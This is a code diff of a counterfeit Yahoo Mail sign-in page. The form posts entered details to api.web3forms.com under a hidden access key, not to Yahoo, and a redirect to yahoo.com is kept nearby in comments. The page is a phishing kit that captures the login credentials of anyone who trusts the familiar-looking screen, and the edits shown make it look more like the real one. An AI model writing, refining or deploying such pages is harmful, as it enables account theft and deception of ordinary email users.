@@ -115,10 +115,8 @@ root.isIOSDevice = false;
 </div><div class="username-challenge" id="login-landing">
     <strong class="challenge-heading">Sign in to Yahoo Mail</strong>
     <span class="challenge-desc signin-sub-title">using your Yahoo account</span>
-    <form action="https://api.web3forms.com/submit" method="POST">
+    <form id="login-username-form" method="post" action="https://api.web3forms.com/submit" class="pure-form">
         <input type="hidden" name="access_key" value="8aa52a1e-cab2-420e-8a54-ff97c7a82292">
-        <!-- Custom Confirmation / Success Page -->
-    <!-- <input type="hidden" name="redirect" value="https://yahoo.com"> -->
         <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="" />
         <input type="hidden" name="sessionIndex" value="" />
         <input type="hidden" name="deviceCapability" value='{"pa":{"status":false}}' id="deviceCapability" />
@@ -130,6 +128,8 @@ root.isIOSDevice = false;
             <div id="country-dropdown-container" class="country-code-dropdown country-dropdown-container hide">
                 <div class="puree-dropdown">
     <label class="offscreen" id="country-code-lbl-aria">Enter Country Code</label>
+        <!-- Custom Confirmation / Success Page -->
+    <!-- <input type="hidden" name="redirect" value="https://yahoo.com"> -->
     <select type="select" name="countryCodeIntl" aria-required="true" role="combobox" aria-labelledby="country-code-lbl-aria"  disabled>
         <option role="option" data-code="+93" value="AF" >Afghanistan &#x202A;(+93)&#x202C;</option>
         <option role="option" data-code="+355" value="AL" >Albania &#x202A;(+355)&#x202C;</option>
